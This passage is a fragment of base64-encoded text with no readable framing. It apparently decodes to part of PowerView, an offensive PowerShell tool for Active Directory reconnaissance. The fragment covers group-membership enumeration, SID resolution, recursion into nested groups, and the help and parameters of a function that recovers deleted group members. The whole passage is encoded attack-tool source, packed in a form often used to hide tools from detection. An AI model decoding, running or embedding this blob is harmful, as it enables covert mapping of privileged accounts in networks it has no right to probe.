9zZSAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gR2V0LURvbWFpbkdyb3VwTWVtYmVyIGZpbHRlciBzdHJpbmc6ICQoJEdyb3VwU2VhcmNoZXIuZmlsdGVyKSIKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdCA9ICRHcm91cFNlYXJjaGVyLkZpbmRPbmUoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluR3JvdXBNZW1iZXJdIEVycm9yIHNlYXJjaGluZyBmb3IgZ3JvdXAgd2l0aCBpZGVudGl0eSAnJElkZW50aXR5JzogJF8iCiAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnMgPSBAKCkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZE5hbWUgPSAnJwogICAgICAgICAgICAgICAgJEdyb3VwRm91bmRETiA9ICcnCgogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHQpIHsKICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyA9ICRSZXN1bHQucHJvcGVydGllcy5pdGVtKCdtZW1iZXInKQoKICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlcnMuY291bnQgLWVxIDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyByYW5nZWQgc2VhcmNoaW5nLCB0aGFua3MgQG1lYXRiYWxsc19fICEKICAgICAgICAgICAgICAgICAgICAgICAgJEZpbmlzaGVkID0gJEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICRCb3R0b20gPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRUb3AgPSAwCgogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoLW5vdCAkRmluaXNoZWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUb3AgPSAkQm90dG9tICsgMTQ5OQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlclJhbmdlPSJtZW1iZXI7cmFuZ2U9JEJvdHRvbS0kVG9wIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEJvdHRvbSArPSAxNTAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRHcm91cFNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQ2xlYXIoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE51bGwgPSAkR3JvdXBTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZCgiJE1lbWJlclJhbmdlIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROdWxsID0gJEdyb3VwU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGQoJ3NhbWFjY291bnRuYW1lJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROdWxsID0gJEdyb3VwU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGQoJ2Rpc3Rpbmd1aXNoZWRuYW1lJykKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHQgPSAkR3JvdXBTZWFyY2hlci5GaW5kT25lKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUmFuZ2VkUHJvcGVydHkgPSAkUmVzdWx0LlByb3BlcnRpZXMuUHJvcGVydHlOYW1lcyAtbGlrZSAibWVtYmVyO3JhbmdlPSoiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnMgKz0gJFJlc3VsdC5Qcm9wZXJ0aWVzLml0ZW0oJFJhbmdlZFByb3BlcnR5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cEZvdW5kTmFtZSA9ICRSZXN1bHQucHJvcGVydGllcy5pdGVtKCdzYW1hY2NvdW50bmFtZScpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwRm91bmRETiA9ICRSZXN1bHQucHJvcGVydGllcy5pdGVtKCdkaXN0aW5ndWlzaGVkbmFtZScpWzBdCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVycy5jb3VudCAtZXEgMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRmluaXNoZWQgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLk1ldGhvZEludm9jYXRpb25FeGNlcHRpb25dIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRmluaXNoZWQgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZE5hbWUgPSAkUmVzdWx0LnByb3BlcnRpZXMuaXRlbSgnc2FtYWNjb3VudG5hbWUnKVswXQogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZEROID0gJFJlc3VsdC5wcm9wZXJ0aWVzLml0ZW0oJ2Rpc3Rpbmd1aXNoZWRuYW1lJylbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnMgKz0gJFJlc3VsdC5Qcm9wZXJ0aWVzLml0ZW0oJFJhbmdlZFByb3BlcnR5KQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwRm91bmREb21haW4gPSAkRG9tYWluCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAjIGlmIGEgZG9tYWluIGlzbid0IHBhc3NlZCwgdHJ5IHRvIGV4dHJhY3QgaXQgZnJvbSB0aGUgZm91bmQgZ3JvdXAgZGlzdGluZ3Vpc2hlZCBuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXBGb3VuZEROKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZERvbWFpbiA9ICRHcm91cEZvdW5kRE4uU3ViU3RyaW5nKCRHcm91cEZvdW5kRE4uSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlciBpbiAkTWVtYmVycykgewogICAgICAgICAgICAgICAgaWYgKCRSZWN1cnNlIC1hbmQgJFVzZU1hdGNoaW5nUnVsZSkgewogICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0aWVzID0gJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzID0gJFNlYXJjaGVyQXJndW1lbnRzLkNsb25lKCkKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzWydSYXcnXSA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAnZGlzdGluZ3Vpc2hlZG5hbWUsY24sc2FtYWNjb3VudG5hbWUsb2JqZWN0c2lkLG9iamVjdGNsYXNzJwogICAgICAgICAgICAgICAgICAgICRPYmplY3QgPSBHZXQtRG9tYWluT2JqZWN0IEBPYmplY3RTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0aWVzID0gJE9iamVjdC5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRQcm9wZXJ0aWVzKSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cERvbWFpbicgJEdyb3VwRm91bmREb21haW4KICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkR3JvdXBGb3VuZE5hbWUKICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBEaXN0aW5ndWlzaGVkTmFtZScgJEdyb3VwRm91bmRETgoKICAgICAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXMub2JqZWN0c2lkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJTSUQgPSAoKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIgJFByb3BlcnRpZXMub2JqZWN0c2lkWzBdLCAwKS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJTSUQgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlckROID0gJFByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXJETiAtbWF0Y2ggJ0ZvcmVpZ25TZWN1cml0eVByaW5jaXBhbHN8Uy0xLTUtMjEnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRNZW1iZXJTSUQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlclNJRCA9ICRQcm9wZXJ0aWVzLmNuWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJTaW1wbGVOYW1lID0gQ29udmVydC1BRE5hbWUgLUlkZW50aXR5ICRNZW1iZXJTSUQgLU91dHB1dFR5cGUgJ0RvbWFpblNpbXBsZScgQEFETmFtZUFyZ3VtZW50cwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlclNpbXBsZU5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlckRvbWFpbiA9ICRNZW1iZXJTaW1wbGVOYW1lLlNwbGl0KCdAJylbMV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluR3JvdXBNZW1iZXJdIEVycm9yIGNvbnZlcnRpbmcgJE1lbWJlckROIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyRG9tYWluID0gJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgY29udmVydGluZyAkTWVtYmVyRE4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlckRvbWFpbiA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGV4dHJhY3QgdGhlIEZRRE4gZnJvbSB0aGUgRGlzdGluZ3Vpc2hlZCBOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyRG9tYWluID0gJE1lbWJlckROLlN1YlN0cmluZygkTWVtYmVyRE4uSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJETiA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJEb21haW4gPSAkTnVsbAogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYgKCRQcm9wZXJ0aWVzLnNhbWFjY291bnRuYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgZm9yZXN0IHVzZXJzIGhhdmUgdGhlIHNhbUFjY291bnROYW1lIHNldAogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyTmFtZSA9ICRQcm9wZXJ0aWVzLnNhbWFjY291bnRuYW1lWzBdCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAjIGV4dGVybmFsIHRydXN0IHVzZXJzIGhhdmUgYSBTSUQsIHNvIGNvbnZlcnQgaXQKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJOYW1lID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTSUQgJFByb3BlcnRpZXMuY25bMF0gQEFETmFtZUFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgdGhlcmUncyBhIHByb2JsZW0gY29udGFjdGluZyB0aGUgZG9tYWluIHRvIHJlc29sdmUgdGhlIFNJRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlck5hbWUgPSAkUHJvcGVydGllcy5jblswXQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXMub2JqZWN0Y2xhc3MgLW1hdGNoICdjb21wdXRlcicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlck9iamVjdENsYXNzID0gJ2NvbXB1dGVyJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRQcm9wZXJ0aWVzLm9iamVjdGNsYXNzIC1tYXRjaCAnZ3JvdXAnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJPYmplY3RDbGFzcyA9ICdncm91cCcKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkUHJvcGVydGllcy5vYmplY3RjbGFzcyAtbWF0Y2ggJ3VzZXInKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJPYmplY3RDbGFzcyA9ICd1c2VyJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlck9iamVjdENsYXNzID0gJE51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlckRvbWFpbicgJE1lbWJlckRvbWFpbgogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJOYW1lJyAkTWVtYmVyTmFtZQogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZScgJE1lbWJlckROCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlck9iamVjdENsYXNzJyAkTWVtYmVyT2JqZWN0Q2xhc3MKICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyU0lEJyAkTWVtYmVyU0lECiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Hcm91cE1lbWJlcicpCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyCgogICAgICAgICAgICAgICAgICAgICMgaWYgd2UncmUgZG9pbmcgbWFudWFsIHJlY3Vyc2lvbgogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JlY3Vyc2UnXSAtYW5kICRNZW1iZXJETiAtYW5kICgkTWVtYmVyT2JqZWN0Q2xhc3MgLW1hdGNoICdncm91cCcpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR3JvdXBNZW1iZXJdIE1hbnVhbGx5IHJlY3Vyc2luZyBvbiBncm91cDogJE1lbWJlckROIgogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkTWVtYmVyRE4KICAgICAgICAgICAgICAgICAgICAgICAgJE51bGwgPSAkU2VhcmNoZXJBcmd1bWVudHMuUmVtb3ZlKCdQcm9wZXJ0aWVzJykKICAgICAgICAgICAgICAgICAgICAgICAgR2V0LURvbWFpbkdyb3VwTWVtYmVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkR3JvdXBTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluR3JvdXBNZW1iZXJEZWxldGVkIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIGluZm9ybWF0aW9uIG9uIGdyb3VwIG1lbWJlcnMgdGhhdCB3ZXJlIHJlbW92ZWQgZnJvbSB0aGUgc3BlY2lmaWVkCmdyb3VwIGlkZW50aXR5LiBBY2NvbXBsaXNoZWQgYnkgc2VhcmNoaW5nIHRoZSBsaW5rZWQgYXR0cmlidXRlIHJlcGxpY2F0aW9uCm1ldGFkYXRhIGZvciB0aGUgZ3JvdXAgdXNpbmcgR2V0LURvbWFpbk9iamVjdExpbmtlZEF0dHJpYnV0ZUhpc3RvcnkuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5PYmplY3RMaW5rZWRBdHRyaWJ1dGVIaXN0b3J5CgouREVTQ1JJUFRJT04KCldyYXBzIEdldC1Eb21haW5PYmplY3RMaW5rZWRBdHRyaWJ1dGVIaXN0b3J5IHRvIHJldHVybiB0aGUgbGlua2VkIGF0dHJpYnV0ZQpyZXBsaWNhdGlvbiBtZXRhZGF0YSBmb3IgdGhlIHNwZWNpZmllZCBncm91cC4gVGhlc2UgYXJlIGNhc2VzIHdoZXJlIHRoZQonVmVyc2lvbicgYXR0cmlidXRlIG9mIGdyb3VwIG1lbWJlciBpbiB0aGUgcmVwbGljYXRpb24gbWV0YWRhdGEgaXMgZXZlbi4KCi5QQVJBTUVURVIgSWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkuCldpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Hcm91cE1lbWJlckRlbGV0ZWQgfCBHcm91cC1PYmplY3QgR3JvdXBETgoKQ291bnQgTmFtZSAgICAgICAgICAgICAgICAgICAgICBHcm91cAotLS0tLSAtLS0tICAgICAgICAgICAgICAgICAgICAgIC0tLS0tCiAgICAyIENOPURvbWFpbiBBZG1pbnMsQ049VXMuLi4ge0B7R3JvdXBETj1DTj1Eb21haW4gQWRtaW5zLENOPVVzZXJzLERDPXRlc3QuLi4KICAgIDMgQ049RG9tYWluTG9jYWxHcm91cCxDTi4uLiB7QHtHcm91cEROPUNOPURvbWFpbkxvY2FsR3JvdXAsQ049VXNlcnMsREM9dC4uLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Hcm91cE1lbWJlckRlbGV0ZWQgIkRvbWFpbiBBZG1pbnMiIC1Eb21haW4gdGVzdGxhYi5sb2NhbAoKCkdyb3VwRE4gICAgICAgICAgICAgICA6IENOPURvbWFpbiBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJETiAgICAgICAgICAgICAgOiBDTj10ZXN0dXNlcixDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsClRpbWVGaXJzdEFkZGVkICAgICAgICA6IDIwMTctMDYtMTNUMjM6MDc6NDNaClRpbWVEZWxldGVkICAgICAgICAgICA6IDIwMTctMDYtMTNUMjM6MjY6MTdaCkxhc3RPcmlnaW5hdGluZ0NoYW5nZSA6IDIwMTctMDYtMTNUMjM6MjY6MTdaClRpbWVzQWRkZWQgICAgICAgICAgICA6IDIKTGFzdE9yaWdpbmF0aW5nRHNhRE4gIDogQ049TlREUyBTZXR0aW5ncyxDTj1QUklNQVJZLENOPVNlcnZlcnMsQ049RGVmYXVsdC1GaXJzdAogICAgICAgICAgICAgICAgICAgICAgICAtU2l0ZS1OYW1lLENOPVNpdGVzLENOPUNvbmZpZ3VyYXRpb24sREM9dGVzdGxhYixEQz1sb2NhCiAgICAgICAgICAgICAgICAgICAgICAgIGwKCkdyb3VwRE4gICAgICAgICAgICAgICA6IENOPURvbWFpbiBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJETiAgICAgICAgICAgICAgOiBDTj1kZm0sQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApUaW1lRmlyc3RBZGRlZCAgICAgICAgOiAyMDE3LTA2LTEzVDIyOjIwOjAyWgpUaW1lRGVsZXRlZCAgICAgICAgICAgOiAyMDE3LTA2LTEzVDIzOjI2OjE3WgpMYXN0T3JpZ2luYXRpbmdDaGFuZ2UgOiAyMDE3LTA2LTEzVDIzOjI2OjE3WgpUaW1lc0FkZGVkICAgICAgICAgICAgOiA1Ckxhc3RPcmlnaW5hdGluZ0RzYUROICA6IENOPU5URFMgU2V0dGluZ3MsQ049UFJJTUFSWSxDTj1TZXJ2ZXJzLENOPURlZmF1bHQtRmlyc3QKICAgICAgICAgICAgICAgICAgICAgICAgLVNpdGUtTmFtZSxDTj1TaXRlcyxDTj1Db25maWd1cmF0aW9uLERDPXRlc3RsYWIsREM9bG9jYQogICAgICAgICAgICAgICAgICAgICAgICBsCgouT1VUUFVUUwoKUG93ZXJWaWV3LkRvbWFpbkdyb3VwTWVtYmVyRGVsZXRlZAoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCByZXBsaWNhdGlvbiBtZXRhZGF0YSBmaWVsZHMuCgouTElOSwoKaHR0cHM6Ly9ibG9ncy50ZWNobmV0Lm1pY3Jvc29mdC5jb20vcGllLzIwMTQvMDgvMjUvbWV0YWRhdGEtMi10aGUtZXBoZW1lcmFsLWFkbWluLW9yLWhvdy10by10cmFjay10aGUtZ3JvdXAtbWVtYmVyc2hpcC8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Eb21haW5Hcm91cE1lbWJlckRlbGV0ZWQnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgIC